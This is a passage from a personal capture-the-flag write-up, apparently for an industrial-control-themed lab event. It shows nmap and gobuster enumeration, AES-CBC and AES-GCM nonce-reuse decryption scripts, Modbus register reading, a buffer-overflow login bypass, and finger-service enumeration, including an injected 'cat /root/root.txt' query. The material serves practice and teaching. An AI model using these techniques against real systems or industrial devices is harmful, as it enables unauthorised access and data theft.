SF:Content-Length:\x200\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2020:10:14\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,DF,"HTTP/1\.1\x2
SF:0204\x20No\x20Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-C
SF:ontrol-Allow-Methods:\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-Control
SF:-Request-Headers\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2027\x20Jun\
SF:x202025\x2020:10:14\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RPCCheck
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.93%I=7%D=6/27%Time=685EFAA0%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,238,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.3\.7\
SF:x20Python/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2020:10:09\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20199\r\nLocation:\x20/login\r\nVary:\x20Cookie\r\nSet-Cookie:\x20ses
SF:sion=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.aF76oQ\.2ydPOa8MwX
SF:rr90Ip2ke5TqKlo20;\x20Expires=Fri,\x2027\x20Jun\x202025\x2020:15:09\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title>\n<h1>Redire
SF:cting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20automatically
SF:\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"/login\">/login</a>\.\x
SF:20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,161,"HTTP/1\.1
SF:\x20200\x20OK\r\nServer:\x20Werkzeug/2\.3\.7\x20Python/3\.12\.3\r\nDate
SF::\x20Fri,\x2027\x20Jun\x202025\x2020:10:09\x20GMT\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nVar
SF:y:\x20Cookie\r\nSet-Cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.aF76
SF:oQ\.bZ8YWBG8a7Z9V9pR06B-B0duoXE;\x20Expires=Fri,\x2027\x20Jun\x202025\x
SF:2020:15:09\x20GMT;\x20HttpOnly;\x20Path=/\r\nContent-Length:\x200\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<ht
SF:ml\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
SF:anation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x
SF:20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(FourOhFourReques
SF:t,21E,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.3\.7\
SF:x20Python/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2020:10:09\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20207\r\nVary:\x20Cookie\r\nSet-Cookie:\x20session=eyJfcGVybWFuZW50Ij
SF:p0cnVlfQ\.aF76oQ\.bZ8YWBG8a7Z9V9pR06B-B0duoXE;\x20Expires=Fri,\x2027\x2
SF:0Jun\x202025\x2020:15:09\x20GMT;\x20HttpOnly;\x20Path=/\r\nConnection:\
SF:x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20No
SF:t\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x
SF:20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\
SF:x20the\x20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and
SF:\x20try\x20again\.</p>\n");
MAC Address: 02:08:F3:02:83:CB (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/27%OT=22%CT=1%CU=34804%PV=Y%DS=1%DC=D%G=Y%M=0208F3%T
OS:M=685EFB60%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms ip-10-10-141-90.eu-west-1.compute.internal (10.10.141.90)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.56 seconds

```

```
22, 80, 102, 502, 1880, 8080, 44818
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316764/image_ajjgol.png)

Not really seeing anything I can do here, let’s check for more directories.

`gobuster dir -u http://10.10.141.90:1880/ -w /root/Desktop/wordlists/dirb/common.txt -x php,txt,json -t 50`

```
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.90:1880/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /root/Desktop/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt,json
[+] Timeout:                 10s
===============================================================
2025/06/27 20:22:19 Starting gobuster in directory enumeration mode
===============================================================
/diagnostics          (Status: 200) [Size: 1587]
/favicon.ico          (Status: 200) [Size: 16958]
/flows                (Status: 200) [Size: 6688]
/icons                (Status: 200) [Size: 966]
/plugins              (Status: 200) [Size: 0]
/red                  (Status: 301) [Size: 153] [--> /red/]
/settings             (Status: 200) [Size: 917]
/theme                (Status: 200) [Size: 313]
/ui                   (Status: 301) [Size: 152] [--> /ui/]
/vendor               (Status: 301) [Size: 156] [--> /vendor/]
Progress: 18235 / 18460 (98.78%)===============================================================
2025/06/27 20:22:36 Finished
===============================================================

```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316767/image_lxgy5i.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316773/image_tibugx.png)

### Thoughts

Frustrating challenge - made worse by the fact that it was worth 0 points.

## No Salt, No Shame

Category: Cryptography

### Description

To “secure” the maintenance logs, Virelia’s gateway vendor encrypted every critical entry with AES-CBC—using the plant’s code name as the passphrase and a fixed, all-zero IV. Of course, without any salt or integrity checks, it’s only obscurity, not true security. Somewhere in those encrypted records lies the actual shutdown command.

**Passphrase:** `VIRELIA-WATER-FAC`

Flag: `THM{cbc_cl3ar4nce_gr4nt3d_10939}`

### Write-up

First we need to figure out what this file is.

`file file shutdown.log-1750934543756.enc`

`shutdown.log-1750934543756.enc: OpenPGP Public Key`

Because the file is encrypted with AES-CBC we need to a 256 bit key to decrypt. We can use the passphrase given to us to create the key.

`echo -n "VIRELIA-WATER-FAC" | sha256sum`

`9cfa5c575052bee2ac406f82dbbcae08a18edf6bba396b9be46231347cf8f959`

Finally we can decrypt the file with the 256 bit key.

`openssl enc -d -aes-256-cbc -in shutdown.log-1750934543756.enc -out shutdown.log -K 9cfa5c575052bee2ac406f82dbbcae08a18edf6bba396b9be46231347cf8f959 -iv 00000000000000000000000000000000`

And then we can go ahead and open the file to get the flag.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316776/image_usnbab.png)

### Thoughts

Cryptography challenges are always a weak point for me but this challenge was a nice introduction for once, and it didn’t require any programming. Nice.

## Echoed Streams

Category: Cryptography

### Description

Three months after the Virelia Water Control Facility was breached, OT traffic
 is finally back online—supposedly “fully remediated.” During a routine 
audit, Black Echo’s red team intercepted two back‐to‐back telemetry 
packets between a pump controller and the SCADA server. Curiously, both 
packets were encrypted under AES‐GCM using the same 16-byte nonce (number used once). The first packet is just regular facility telemetry; the second contains a hidden sabotage command with the kill-switch flag. Your job is to recover that flag and stop the attack.

Each file is formatted as:

`[16 bytes GCM nonce] ∥ [96 bytes ciphertext] ∥ [16 bytes GCM tag]`

We know that the first plaintext (96 bytes) is the facility’s standard telemetry string, exactly:

`BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;`

The second packet follows the same format but carries the kill switch command and flag. We need you to decrypt the contents of `cipher2.bin` so that we can recover and disable the kill switch.

Flag: `THM{Echo_Telemetry}`

### Write-up

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316779/image_omdaco.png)

This attack exploits a critical vulnerability in AES-GCM: nonce reuse. When the same nonce is used to encrypt two different messages with the same key, it completely breaks the security of the stream cipher component of GCM mode.

AES-GCM works by generating a keystream based on the key and nonce, then XORing this keystream with the plaintext. When two messages use the same nonce, they use the same keystream. This means if we XOR the two ciphertexts together, the keystream cancels out, leaving us with the XOR of the two plaintexts: C1 ⊕ C2 = (P1 ⊕ K) ⊕ (P2 ⊕ K) = P1 ⊕ P2. Since we know the first plaintext (the telemetry string), we can recover the second plaintext by XORing again: P2 = (P1 ⊕ P2) ⊕ P1.

The code implements this attack by first extracting the actual ciphertext portions from both files (skipping the 16-byte nonce and 16-byte authentication tag). It then handles the padding issue - since the known plaintext is 95 bytes but the ciphertext is 96 bytes, we pad the plaintext with one byte to match. Finally, it performs the double XOR operation: first XORing the two ciphertexts to get the XOR of plaintexts, then XORing with the known plaintext to recover the hidden sabotage command containing the flag. This elegant attack demonstrates why nonce reuse is catastrophic in stream cipher modes - it allows full plaintext recovery without knowing the encryption key.

```python
from Crypto.Util.strxor import strxor

# Known plaintext from cipher1(1).bin
plaintext1 = b"BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;"

# Read the binary files
with open("cipher1(1).bin", "rb") as f1, open("cipher2(1).bin", "rb") as f2:
    cipher1 = f1.read()
    cipher2 = f2.read()

# Extract the ciphertexts (skip the first 16 bytes for the nonce and the last 16 bytes for the tag)
ciphertext1 = cipher1[16:-16]
ciphertext2 = cipher2[16:-16]

# Debugging: Check lengths
print("Length of ciphertext1:", len(ciphertext1))
print("Length of ciphertext2:", len(ciphertext2))
print("Length of plaintext1:", len(plaintext1))

# Ensure ciphertexts are the same length
if len(ciphertext1) != len(ciphertext2):
    raise ValueError("Ciphertexts are not the same length!")

# Pad plaintext1 to match ciphertext length
if len(plaintext1) < len(ciphertext1):
    padding_length = len(ciphertext1) - len(plaintext1)
    plaintext1_padded = plaintext1 + (b'\x01' * padding_length)  # Simple padding with 0x01
    print(f"Added {padding_length} byte(s) of padding to plaintext1")
else:
    plaintext1_padded = plaintext1

# XOR the ciphertexts to get plaintext1 ⊕ plaintext2
xor_plaintexts = strxor(ciphertext1, ciphertext2)

# XOR again with padded plaintext1 to recover plaintext2
plaintext2_padded = strxor(xor_plaintexts, plaintext1_padded)

# Remove padding from plaintext2 (assuming it ends at the same position as plaintext1)
plaintext2 = plaintext2_padded[:len(plaintext1)]

# Print the recovered plaintext2
print("Recovered plaintext2:", plaintext2.decode())
```

`python echo.py`

```
Length of ciphertext1: 96
Length of ciphertext2: 96
Length of plaintext1: 95
Added 1 byte(s) of padding to plaintext1
Recovered plaintext2: BEGIN TELEMETRY VIRELIA;ID=TRX0110393939DC;PUMP=ON;VALVE=OPEN;TEMP=1.0;KILL=THM{Echo_Telemetry}
```

### Thoughts

This is as far as I got with Cryptography in this CTF.

## Rogue Poller

Category: Networking

### Description

An intruder has breached the internal OT network and systematically probed industrial devices for sensitive data. Network captures reveal unusual traffic from a suspicious host scanning PLC memory over TCP port 502.

Analyse the provided PCAP and uncover what data the attacker retrieved during their register scans.

Flag: `THM{1nDu5t_r14L_r3g1st3rs}`

### Write-up

So straight away from the `pcap` file we know that ther are only two IP addresses communicating - and the majority of the traffic is port `502` so there isn’t much to filter down.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316783/image_jgym7u.png)

I don’t have much knowledge about this type of challenge but I’m just going to wing it. I know that `modbus` has something to do with industrial systems to I’m just going to follow the stream from the first packet that uses it.

```
...........
............
.............
............
.............
.
..........
.
...........
............
...........TH
............
.........M{1n
............
.........Du5t
......... ..
.........r14L
........."..
........._r3g
.........$..
.........1st3
.........&..
.........rs}.
.........(..
.............
.........*..
.............
.........,..
.............
............
.............
.........0..
.............
.........2..
.............
.........4..
.............
.........6..
.............
.........8..
.............
.........:..
.............
.........<..
.............
. .......>..
. ...........
.!.......@..
.!...........
.".......B..
."...........
.#.......D..
.#...........
.$.......F..
.$...........
.%.......H..
.%...........
.&.......J..
.&...........
.'.......L..
.'...........
.(.......N..
.(...........
.).......P..
.)...........
.*.......R..
.*...........
.+.......T..
.+...........
.,.......V..
.,...........
.-.......X..
.-...........
.........Z..
.............
./.......\..
./...........
.0.......^..
.0...........
.1.......`..
.1...........
.2.......b..
.2...........
```

```
TH
............
.........M{1n
............
.........Du5t
......... ..
.........r14L
........."..
........._r3g
.........$..
.........1st3
.........&..
.........rs}.
.........(..
```

Wow, the flag is just there. Awesome.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316786/image_r0vieu.png)

### Thoughts

Difficulty level was fair. Always good to get some practice with WireShark.

## Register Sweep

Category: Networking

### Description

During a recent audit of legacy OT systems, engineers identified an undocumented Modbus TCP device still active on the network. It's believed this device was once used for temporary configuration storage during early system deployment, but its documentation has since been lost.

You've been tasked with manually inspecting the device's register space to ensure nothing sensitive remains embedded within it. Most data appears normal, but a specific holding register contains deliberately stored ASCII-encoded information that must be retrieved and reviewed.

Start the machine by clicking the start machine button. You may access the Modbus service on port 502.

Flag: `THM{m4nu4l_p0ll1ng_r3g1st3rs}`

### Write-up

`nmap -p 502 10.10.147.232`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-27 21:08 UTC
Nmap scan report for ip-10-10-147-232.eu-west-1.compute.internal (10.10.147.232)
Host is up (0.0018s latency).

PORT    STATE SERVICE
502/tcp open  mbap
MAC Address: 02:2D:00:2C:EC:B5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds

```

It’s open and listening but I have no idea how to connect to it.

https://github.com/sourceperl/mbtget

Install this tool to communicate and then we need explore how the hell it works.

`./mbtget -a 0 -n 10 10.10.147.232`

```
values:
  1 (ad 00000): 52317
  2 (ad 00001): 49314
  3 (ad 00002): 49742
  4 (ad 00003): 36983
  5 (ad 00004): 26408
  6 (ad 00005): 54146
  7 (ad 00006): 40590
  8 (ad 00007): 18237
  9 (ad 00008): 29649
 10 (ad 00009): 13527

```

So we can read 10 registers starting from address 0. I don’t really understand what the heck that means at this point. According to the hint I need to find ASCI embedded in these somewhere.

```
Register Address	Value	Hexadecimal Representation
00000	52317	CC7D
00001	49314	C0C2
00002	49742	C2DE
00003	36983	9067
00004	26408	6738
00005	54146	D3E2
00006	40590	9E5E
00007	18237	473D
00008	29649	73F1
00009	13527	34D7
```

I’m not really sure how this works or relates to ASCI values to be honest.

So `-a` is where to start looking in the register, and `-n` is the number of registers to show from that point.

Ok, so I need to comb through the registers and look for ASCII values that look like a flag.

```
T = ASCII 84
H = ASCII 72
M = ASCII 77
{ = ASCII 123
```

But I don’t understand how the modbus output looks like that, because it doesn’t. From my research I’m reading that each register (the part on the right) contains 2 bytes that could represent 2 ASCII characters. So it would actually look something like this:

```
TH = 0x5448 = 21576
M{ = 0x4D7B = 19835
```

Has to be done in increments of 100 otherwise it errors out. I did this twice and then found `21576` followed by `19835` within 100-200.

`./mbtget -a 100 -n 100 10.10.147.232`

```
 70 (ad 00169): 21576
 71 (ad 00170): 19835
```

```
values:
  1 (ad 00100): 39012
  2 (ad 00101): 42968
  3 (ad 00102): 46362
  4 (ad 00103): 54179
  5 (ad 00104): 13113
  6 (ad 00105): 31560
  7 (ad 00106):  7197
  8 (ad 00107):  7159
  9 (ad 00108): 25724
 10 (ad 00109):  9108
 11 (ad 00110): 20233
 12 (ad 00111): 27008
 13 (ad 00112): 53488
 14 (ad 00113): 42288
 15 (ad 00114):  8593
 16 (ad 00115): 21952
 17 (ad 00116): 57312
 18 (ad 00117): 36591
 19 (ad 00118): 34958
 20 (ad 00119): 33410
 21 (ad 00120): 17099
 22 (ad 00121): 48057
 23 (ad 00122): 23275
 24 (ad 00123): 10846
 25 (ad 00124): 18721
 26 (ad 00125): 44725
 27 (ad 00126): 48764
 28 (ad 00127): 41952
 29 (ad 00128): 50966
 30 (ad 00129): 19364
 31 (ad 00130): 65206
 32 (ad 00131): 22983
 33 (ad 00132): 32993
 34 (ad 00133): 65165
 35 (ad 00134): 65355
 36 (ad 00135):  8270
 37 (ad 00136): 38667
 38 (ad 00137): 34600
 39 (ad 00138): 53786
 40 (ad 00139): 53545
 41 (ad 00140): 50198
 42 (ad 00141): 39149
 43 (ad 00142): 63415
 44 (ad 00143): 63384
 45 (ad 00144): 56492
 46 (ad 00145):  9922
 47 (ad 00146): 34824
 48 (ad 00147):  9428
 49 (ad 00148): 38098
 50 (ad 00149): 21784
 51 (ad 00150): 34711
 52 (ad 00151): 11002
 53 (ad 00152): 49205
 54 (ad 00153): 58211
 55 (ad 00154): 38882
 56 (ad 00155): 63600
 57 (ad 00156): 38982
 58 (ad 00157): 21660
 59 (ad 00158):  4334
 60 (ad 00159): 48085
 61 (ad 00160): 25400
 62 (ad 00161): 62317
 63 (ad 00162): 53339
 64 (ad 00163): 13736
 65 (ad 00164): 22235
 66 (ad 00165): 65158
 67 (ad 00166): 28520
 68 (ad 00167): 50837
 69 (ad 00168): 58160
 70 (ad 00169): 21576
 71 (ad 00170): 19835
 72 (ad 00171): 27956
 73 (ad 00172): 28277
 74 (ad 00173): 13420
 75 (ad 00174): 24432
 76 (ad 00175): 12396
 77 (ad 00176): 27697
 78 (ad 00177): 28263
 79 (ad 00178): 24434
 80 (ad 00179): 13159
 81 (ad 00180): 12659
 82 (ad 00181): 29747
 83 (ad 00182): 29299
 84 (ad 00183): 32000
 85 (ad 00184):  9643
 86 (ad 00185): 40939
 87 (ad 00186):  8712
 88 (ad 00187): 54097
 89 (ad 00188): 35839
 90 (ad 00189): 45418
 91 (ad 00190): 19136
 92 (ad 00191): 13369
 93 (ad 00192): 58261
 94 (ad 00193):  8657
 95 (ad 00194): 56650
 96 (ad 00195): 27509
 97 (ad 00196): 43022
 98 (ad 00197): 42006
 99 (ad 00198): 18103
100 (ad 00199):  7943
```

Run through some Python code.

```python
# List of 16-bit Modbus holding register values containing the encoded flag
values = [21576, 19835, 27956, 28277, 13420, 24432, 12396, 27697, 28263, 24434, 13159, 12659, 29747, 29299, 32000]

# Initialize empty string to store the decoded flag
flag = ""

# Process each 16-bit register value
for val in values:
    # Extract high byte (upper 8 bits) by right-shifting 8 positions and masking
    high_byte = (val >> 8) & 0xFF
    
    # Extract low byte (lower 8 bits) by masking with 0xFF
    low_byte = val & 0xFF
    
    # Check if high byte is printable ASCII (32-126 range: space to tilde)
    if 32 <= high_byte <= 126:
        flag += chr(high_byte)  # Convert byte to ASCII character and append
    
    # Check if low byte is printable ASCII (32-126 range)
    if 32 <= low_byte <= 126:
        flag += chr(low_byte)   # Convert byte to ASCII character and append

# Output the complete decoded flag
print(flag)
```

The code decodes 16-bit Modbus register values by splitting each into two 8-bit bytes, then converting any printable ASCII bytes (values 32-126) into their corresponding characters to reconstruct the hidden flag string.

### Thoughts

 My first experience with a Modbus challenge. It was a decent introduction, but a little confusing to get the flag but was able to spot the double byte problem.

## Start

Category: pwn

### Description

A stray input at the operator console is all it needs. Buffers break, execution slips, and control pivots in the blink of an eye.

Flag: `THM{nice_place_t0_st4rt}`

### Write-up

There’s a site and then there is also a file that can be run.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316788/image_lwvhvy.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316791/image_aufriz.png)

`strings ./start`

```
/lib64/ld-linux-x86-64.so.2
fgets
setvbuf
stdin
puts
exit
fopen
stdout
__libc_start_main
fclose
printf
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
__gmon_start__
PTE1
H=P@@
flag.txt
Flag file not found!
Enter your username: 
Access denied.
Welcome, admin!
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
chal.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
stdout@GLIBC_2.2.5
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
printf@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
_dl_relocate_static_pie
__bss_start
main
setvbuf@GLIBC_2.2.5
fopen@GLIBC_2.2.5
print_flag
exit@GLIBC_2.2.5
__TMC_END__
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

It’s expecting a flag file so let’s create one.

`echo "test" > flag.txt`

```
Enter your username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Welcome, admin!
test
```

Interesting. I put a load of characters in and it said welcome. And then it said “test” which means it read the flag. So now I just need to emulate this in the browser and it should read the flag!

`nc 10.10.150.101 9008`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316793/image_nrwgzf.png)

### Thoughts

Simple challenge which didn’t take me long to crack. Not sure why this challenge is a `pwn` challenge rather than reversing. Newer players would have gone down many rabbit holes because of the miss match.

## Chess Industry

Category: Boot2root

### Description

NullRook prowls a smart chessboard hub where automation meets strategy. In the digital workshop, subtle flaws in the robot interface threaten to tip the balance of play.

Flags:

What is the content of user.txt?

`THM{bishop_to_c4_check}`

What is the content of root.txt?

`THM{check_check_check_mate}`

### Write-up

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316796/image_oyyxqy.png)

`gobuster dir -u http://10.10.33.251/ -w /usr/share/wordlists/dirb/common.txt`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.33.251/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 6829]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

403 responses are interesting because it means I don’t have access to view them, not that they aren’t there. Cheeky little Nmap scan as well.

`nmap -A -T4 -p- 10.10.33.251`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 06:59 EDT
Nmap scan report for 10.10.33.251
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:b8:e8:07:68:da:ac:78:31:f0:74:e3:f6:ae:7c:a4 (ECDSA)
|_  256 4a:48:95:85:ff:b8:d1:1c:2a:31:14:d4:3f:56:a9:b9 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: PrecisionChess IoT - Smart Chessboard Control
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   20.01 ms 10.21.0.1
2   20.01 ms 10.10.33.251

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.51 seconds
```

Ok so I re-read the submission point and found that you actually have to answer two questions about `user.txt` and `root.txt` so I went down a rabbit hole straight away. So there might be a LFI vulnerability somewhere on here? I am so lost.

Going back to port `79` because what else is there?

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html?highlight=port%2079#basic-info

`finger [admin@10.10.12.158](mailto:admin@10.10.12.158)`

```
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Last login Thu Jan  1 00:00 1970 (UTC) on 
No mail.
No Plan.
```

`finger user[@10.10.12.158](mailto:admin@10.10.12.158)`

```
Login: fwupd-refresh                    Name: fwupd-refresh user
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
```

`finger "cat /root/root.txt"@10.10.12.158`

```
cat: /root/root.txt: Permission denied
No one logged on.
```

We are getting some where, we are able to LFI the `finger` service, but we don’t have permission with the current user to read `root.txt` .

Ok so going back to the enumeration above - `root` is in directory `/root` and `user` is in directory `/run/systemd` . And it appears no one is logged on, which I don’t know is good or not.

[GitHub - pentestmonkey/finger-user-enum: Username guessing tool primarily for use against the default Solaris finger service. Also supports relaying of queries through another finger server.](https://github.com/pentestmonkey/finger-user-enum/tree/master)

Ran it but it appears to just test users - we already know the users exist. OK, wait `user` doesn’t exist, but `fwupd-refresh user` does.

`msfconsole`

`use auxiliary/scanner/finger/finger_users`

`set RHOSTS <IP>`

`run`

```
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: _apt
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: backup
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: bin
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: daemon
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: games
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: gnats
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: irc
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: landscape
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: list
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: lp
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: lxd
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: mail
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: man
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: messagebus
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: news
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: nobody
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: pollinate
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: proxy
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: root
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: sshd
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: sync
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: sys
